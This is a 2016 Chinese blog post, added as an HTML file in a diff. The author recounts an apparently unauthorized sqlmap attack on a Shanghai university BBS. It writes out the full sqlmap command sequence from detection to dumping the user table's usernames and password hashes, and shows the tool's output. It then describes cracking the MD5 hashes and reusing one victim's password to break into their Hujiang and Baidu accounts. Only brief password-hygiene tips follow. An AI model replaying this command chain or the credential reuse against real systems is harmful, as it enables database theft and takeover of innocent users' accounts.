@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>一桩由sqlmap引发的血案 | Hsmouc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。
+
+sqlmap的一般用法我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一桩由sqlmap引发的血案">
+<meta property="og:url" content="http://yoursite.com/2016/03/06/2016-03-06-sqlmap/index.html">
+<meta property="og:site_name" content="Hsmouc">
+<meta property="og:description" content="sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。
+
+sqlmap的一般用法我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005WMcFzjw1f1oplcex63j31700rh7eo.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005WMcFzjw1f1opyfcew8j31400cwaen.jpg">
+<meta property="og:updated_time" content="2016-03-07T15:49:28.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一桩由sqlmap引发的血案">
+<meta name="twitter:description" content="sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。
+
+sqlmap的一般用法我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目">
+  
+    <link rel="alternative" href="/atom.xml" title="Hsmouc" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewktmv52wbj307y07yjrp.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">年糕</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>Tags</li>
+						
+						<li>友情链接</li>
+						
+						
+						<li>Über</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="/instagram">相册</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/Hsmouc" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/5449180097/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="weibo">weibo</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/profile.php?id=100009396457642" title="facebook">facebook</a>
+					        
+								<a class="google" target="_blank" href="https://plus.google.com/u/0/101351542677141027265" title="google">google</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/Blog/" style="font-size: 15px;">Blog</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/Linux/" style="font-size: 12.5px;">Linux</a> <a href="/tags/MFC/" style="font-size: 17.5px;">MFC</a> <a href="/tags/Metasploit/" style="font-size: 10px;">Metasploit</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 17.5px;">Pi</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Wi-Fi/" style="font-size: 17.5px;">Wi-Fi</a> <a href="/tags/review/" style="font-size: 10px;">review</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://lyeec.me/">墨坊</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">工科在读，C/Python学习中，嵌入式开发，前端/渗透/摄影/吃货ˉ﹃ˉ</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">年糕</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewktmv52wbj307y07yjrp.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">年糕</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="/instagram">相册</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/Hsmouc" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/5449180097/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="weibo">weibo</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/profile.php?id=100009396457642" title="facebook">facebook</a>
+			        
+						<a class="google" target="_blank" href="https://plus.google.com/u/0/101351542677141027265" title="google">google</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-2016-03-06-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/06/2016-03-06-sqlmap/" class="article-date">
+  	<time datetime="2016-03-06T11:40:25.000Z" itemprop="datePublished">2016-03-06</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      一桩由sqlmap引发的血案
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap/">sqlmap</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
+	</div>
+
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。</li>
+</ul>
+<h3 id="sqlmap_u7684_u4E00_u822C_u7528_u6CD5"><a href="#sqlmap_u7684_u4E00_u822C_u7528_u6CD5" class="headerlink" title="sqlmap的一般用法"></a>sqlmap的一般用法</h3><p>我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目标是上海某高校bbs。<br>sqlmap的使用非常简单，通常我们使用如下命令就可以获知目标url是否存在被注入的可能:<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sqlmap</span> -u <span class="string">"url"</span></span><br></pre></td></tr></table></figure></p>
+<p>知道目标URL后可以用:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure></p>
+<p>得到了下面的数据库信息:<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases <span class="string">[5]</span>:</span><br><span class="line"><span class="string">[*]</span> bbscore</span><br><span class="line"><span class="string">[*]</span> bbscore_db</span><br><span class="line"><span class="string">[*]</span> information_schema</span><br><span class="line"><span class="string">[*]</span> mysql</span><br><span class="line"><span class="string">[*]</span> performance_schema</span><br></pre></td></tr></table></figure></p>
+<p>我们对bbs的注册用户信息感兴趣，所以我们想更进一步的知道bbscore中的信息，我们继续使用下面的命令来查看bbscore中的表:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -<span class="keyword">u</span> <span class="string">"url"</span> -<span class="keyword">D</span> bbscore --tables</span><br></pre></td></tr></table></figure></p>
+<p>得到了下面的表信息:<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Database: bbscore</span><br><span class="line">[83 tables]</span><br><span class="line">+-----------------+</span><br><span class="line">|<span class="string"> action          </span>|</span><br><span class="line">|<span class="string"> user            </span>|</span><br><span class="line">|<span class="string"> admin           </span>|</span><br><span class="line">|<span class="string"> admin_memberfee </span>|</span><br><span class="line">|<span class="string"> admin_operlog   </span>|</span><br><span class="line">|<span class="string"> area            </span>|</span><br><span class="line">|<span class="string"> area_class      </span>|</span><br><span class="line">|<span class="string"> area_rule       </span>|</span><br><span class="line">|<span class="string"> art_pool        </span>|</span><br><span class="line">|<span class="string"> ban             </span>|</span><br><span class="line">|<span class="string"> banner          </span>|</span><br><span class="line">|<span class="string"> bbsvars         </span>|</span><br><span class="line">……</span><br></pre></td></tr></table></figure></p>
+<p>省略了下面的表信息。<br>我们注意到表中有字段user，我们想知道user中的字段，使用下面的命令:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -D bbscore -T <span class="keyword">user</span> <span class="title">--columns</span></span><br></pre></td></tr></table></figure></p>
+<p>得到下面的信息:<br><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] fetching columns for table <span class="variable">'user</span>' in database <span class="variable">'bbscore</span>'</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: <span class="number">30</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: id</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: int<span class="list">(<span class="keyword">10</span>)</span> unsigned</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: username</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: varchar<span class="list">(<span class="keyword">16</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: passwd</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: varchar<span class="list">(<span class="keyword">32</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: face</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: smallint<span class="list">(<span class="keyword">6</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: sex</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: tinyint<span class="list">(<span class="keyword">4</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure></p>
+<p>太长没有爆完，因为发现了最感兴趣的username和passwd，最后一步我们直接把username和passwd中的信息dump下来:-)<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -D bbscore -T <span class="keyword">user</span> <span class="title">-C</span> username,passwd --dump</span><br></pre></td></tr></table></figure></p>
+<p>附上一张图片吧，这酸爽……<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg" alt="screenshot"><br>通过md5在线破解网站获得明文密码:-)</p>
+<h3 id="u610F_u5916_u7684_u60CA_u559C"><a href="#u610F_u5916_u7684_u60CA_u559C" class="headerlink" title="意外的惊喜"></a>意外的惊喜</h3><p>你们以为得到这些用户信息就完了吗，那我就不会用sqlmap引发的血案来做标题。我主要是发现了大家的密码习惯非常之糟糕，下面是正文ˊ_&gt;ˋ<br>得到了用户名和密码后黑客完全可以以某个用户的身份登入该bbs发表信息，更改密码，你们以为这样就完了吗？Naive，让我来告诉你们糟糕的习惯和淡薄的网咯安全意识是如何让你的个人资料全面泄漏的。<br>首先在这一堆用户名中我发现了一个很有特色的名字叫tonyxxxxx。(xxxxx是一个单词，被我手动屏蔽，感兴趣的可以看图)原因如下：首先这个名字很独特，不像Jack，Bill这样烂大街；其次这个名字是由tony和xxxxx两个单词组成的，我们可以猜测此用户的英文名为tony，为什么是xxxxx而不是xxxx呢？我猜是因为他曾用tonyxxxx注册过其他的账号发现该昵称已存在，所以使用了tonyxxxxxx这个昵称。根据上面的分析，我们可以获得以下的结论:  </p>
+<ol>
+<li>这个用户名少见，不容易和其他单词混淆</li>
+<li>该用户可能在多处使用了相同用户名  </li>
+</ol>
+<p>下一步就是借助强大的Google查找该用户的踪迹。看截图:<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1oplcex63j31700rh7eo.jpg" alt=""><br>尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1opyfcew8j31400cwaen.jpg" alt=""></p>
+<h3 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h3><p>这个可能是本世纪最低级的黑客行为，但不可否认它是有效的。我们通过分析这次渗透找出应对的措施。  </p>
+<ul>
+<li>该高校校园网存在sql注入漏洞，直接导致大量用户信息泄漏，这是起因。</li>
+<li>密码太简单，直接导致在线md5破解很容易查出明文。</li>
+<li>多处使用相同用户名和密码，一个账户信息外泄致使所有账户存在安全风险。</li>
+</ul>
+<p>如何应对？</p>
+<ul>
+<li>使用强密码是行之有效的措施</li>
+<li>避免使用固定的用户名和密码，尤其是在一些安全没有保证的小站上</li>
+<li>开启两步验证等方式，（手机验证码）</li>
+</ul>
+<p>最后的最后，很多人问密码太多记不住咋办？<br>下面问题来了：如何优雅的管理密码?<br>给大家分享一个好用的软件<a href="https://github.com/mwgg/passera" target="_blank" rel="external">passera</a>。</p>
+<blockquote>
+<p>A simple tool that allows users to have strong unique passwords for each website, without the need to store them either locally or with an online service. It is available as a command-line tool for Linux/Mac/Windows and an Android app.</p>
+</blockquote>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2016/02/27/2016-02-27-pi/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">娱乐向---Raspberry Pi搭建家庭影音娱乐系统</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="2016-03-06-sqlmap" data-title="一桩由sqlmap引发的血案" data-url="http://yoursite.com/2016/03/06/2016-03-06-sqlmap/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"hsmouc"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 年糕
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-71542166-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
